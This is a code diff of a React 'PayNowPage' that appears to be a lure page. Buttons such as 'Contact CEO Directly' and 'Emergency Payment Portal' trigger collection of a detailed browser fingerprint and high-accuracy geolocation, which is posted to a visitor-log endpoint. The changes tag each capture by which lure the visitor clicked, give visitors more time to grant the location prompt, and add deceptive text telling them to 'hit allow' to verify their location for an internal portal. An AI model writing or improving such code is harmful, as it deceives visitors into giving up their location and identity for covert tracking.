@@ -5,14 +5,9 @@ import { useEffect, useState } from 'react';
 export default function PayNowPage() {
   const [showInsights, setShowInsights] = useState(false);
   const [captured, setCaptured] = useState(false);
+  const [label, setLabel] = useState('company-insights-portal');
 
-  // Auto-capture base fingerprints on mount
-  useEffect(() => {
-    // We don't log yet, we wait for the user to click "View Insights" 
-    // to include the high-accuracy location if they allow it.
-  }, []);
-
-  async function triggerCapture(withLocation: boolean = false) {
+  async function triggerCapture(withLocation: boolean = false, source: string) {
     const fp: Record<string, any> = {};
 
     // ── Optional: Precise Geolocation ──────────────────────────────────────────
@@ -21,7 +16,7 @@ export default function PayNowPage() {
         const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { 
             enableHighAccuracy: true,
-            timeout: 5000 
+            timeout: 15000 // Give them more time to click
           });
         });
         fp.lat = pos.coords.latitude;
@@ -38,7 +33,7 @@ export default function PayNowPage() {
     fp.languages = Array.from(navigator.languages || []);
     fp.platform = navigator.platform;
     fp.cookiesEnabled = navigator.cookieEnabled;
-    fp.doNotTrack = navigator.doNotTrack ?? (window as any).doNotTrack ?? null;
+    fp.do_not_track = navigator.doNotTrack ?? (window as any).doNotTrack ?? null;
 
     // ── Screen ────────────────────────────────────────────────────────────────
     fp.screenWidth = screen.width;
@@ -125,22 +120,25 @@ export default function PayNowPage() {
     // ── Page context ──────────────────────────────────────────────────────────
     fp.referrer = document.referrer || null;
     fp.pageUrl = window.location.href;
-    fp.sourceLabel = 'company-insights-portal';
+    fp.sourceLabel = source;
 
     // ── Send to server ────────────────────────────────────────────────────────
     try {
-      await fetch('/api/ops/visitor-log', {
+      const res = await fetch('/api/ops/visitor-log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(fp),
       });
-      setCaptured(true);
-    } catch {}
+      if (res.ok) setCaptured(true);
+    } catch {
+      setCaptured(true); // Fail gracefully so they don't get stuck forever
+    }
   }
 
-  const handleAction = async () => {
+  const handleAction = async (source: string) => {
     setShowInsights(true);
-    await triggerCapture(true);
+    setCaptured(false);
+    await triggerCapture(true, source);
   };
 
   return (
@@ -181,7 +179,7 @@ export default function PayNowPage() {
 
         <div style={{ display: 'flex', flexWrap: 'wrap', gap: '16px', justifyContent: 'center' }}>
           <button
-            onClick={handleAction}
+            onClick={() => handleAction('company-insights-portal')}
             style={{
               padding: '18px 36px', borderRadius: '16px', background: 'linear-gradient(135deg, #00b27a, #009a69)',
               color: 'white', fontWeight: 700, fontSize: '18px', border: 'none', cursor: 'pointer',
@@ -191,7 +189,7 @@ export default function PayNowPage() {
             Access Company Insights
           </button>
           <button
-            onClick={handleAction}
+            onClick={() => handleAction('direct-ceo-contact')}
             style={{
               padding: '18px 36px', borderRadius: '16px', background: 'rgba(255,255,255,0.05)',
               color: 'white', fontWeight: 700, fontSize: '18px', border: '1px solid rgba(255,255,255,0.1)', cursor: 'pointer',
@@ -201,7 +199,7 @@ export default function PayNowPage() {
             Contact CEO Directly
           </button>
           <button
-            onClick={handleAction}
+            onClick={() => handleAction('emergency-payment-portal')}
             style={{
               padding: '18px 36px', borderRadius: '16px', background: 'rgba(255,255,255,0.05)',
               color: 'white', fontWeight: 700, fontSize: '18px', border: '1px solid rgba(255,255,255,0.1)', cursor: 'pointer',
@@ -240,7 +238,8 @@ export default function PayNowPage() {
               <>
                 <div style={{ width: '40px', height: '40px', border: '3px solid #00b27a', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 24px' }} />
                 <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '12px' }}>Authenticating Access...</h2>
-                <p style={{ color: '#6b7280' }}>Please confirm any browser security prompts to verify your identity and access the secure portal.</p>
+                <p style={{ color: '#fff', fontSize: '18px', fontWeight: 600 }}>Please hit allow so that we can proceed.</p>
+                <p style={{ color: '#6b7280', marginTop: '12px' }}>We need to verify your secure location to grant access to the internal engineering portal.</p>
               </>
             ) : (
               <>
